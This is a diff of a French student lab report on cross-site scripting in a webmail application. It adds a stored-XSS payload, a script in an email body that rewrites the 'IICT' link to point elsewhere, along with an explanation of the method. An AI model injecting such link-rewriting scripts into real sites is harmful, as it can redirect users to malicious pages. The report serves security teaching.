@@ -245,6 +245,8 @@ On peut injecter un script en JavaScript dans le body de l'email qui va lancer u
 
 Identique que pour la manipulation ci-dessus, sauf que la ligne sera insérée dans le sujet de l'email.
 
+![](./img/Manip_10.3.png)
+
 ### Question 10.1
 > Donnez 2 actions malveillantes qu’un attaquant pourrait commettre en exploitant
 > cette vulnérabilité.
@@ -262,8 +264,49 @@ Cette vulnérabilité s'appelle Cross-site scripting, car l'attaquant injecte du
 
 Interdire l'injection de code javascript dans les emails, comme cela est déjà le cas actuellement.
 
+### Manipulation 10.4 
+> Lors de la lecture d’un message, en bas de page, il y a un lien « IICT » qui redirige
+> vers la page de l’IICT sur le site web de la HEIG.
+> Envoyer un message à l’utilisateur « test2 » avec l’objectif suivant :
+> Faire en sorte que lorsque cet utilisateur sera en train de lire ce message, s’il clique
+> sur le lien IICT, ce ne soit pas la page de l’IICT qui s’ouvre, mais la page d’accueil
+> de la HEIG-VD (http ://www.heig-vd.ch).
+
+Pour ce faire, il suffit d'ajouter un code javascript qui va récupérer le lien href de la balise IICT et le modifier pour qu'il soit rediriger vers le site de l'heig-vd.
+
+```
+<script type="text/javascript">
+  window.onload = function() {
+    var liens = document.getElementsByTagName("a")
+    for(var i = 0; i < liens.length; ++i){
+        if(liens[i].href.includes("https://heig-vd.ch/instituts/iict")){
+            liens[i].href = "https://www.heig-vd.ch";
+            break;
+        }
+    }
+  };
+</script>
+```
+
 ### Question 10.4
 > Expliquez la méthode d’exploitation utilisée pour réaliser cette attaque. Fournissez un
 > exemple complet d’une entrée utilisateur permettant cette exploitation.
 
-To do.
+La méthode d'exploitation est similaire aux deux précédantes, elle consiste à injecter un code javascript sur la page html.
+
+Pour ce faire, le code ci-dessous a été créé, il va récupérer le lien href de la balise IICT et le modifier pour qu'il soit rediriger vers le site de l'heig-vd.
+
+```
+<script type="text/javascript">
+  window.onload = function() {
+    var liens = document.getElementsByTagName("a")
+    for(var i = 0; i < liens.length; ++i){
+        if(liens[i].href.includes("https://heig-vd.ch/instituts/iict")){
+            liens[i].href = "https://www.heig-vd.ch";
+            break;
+        }
+    }
+  };
+</script>
+```
+
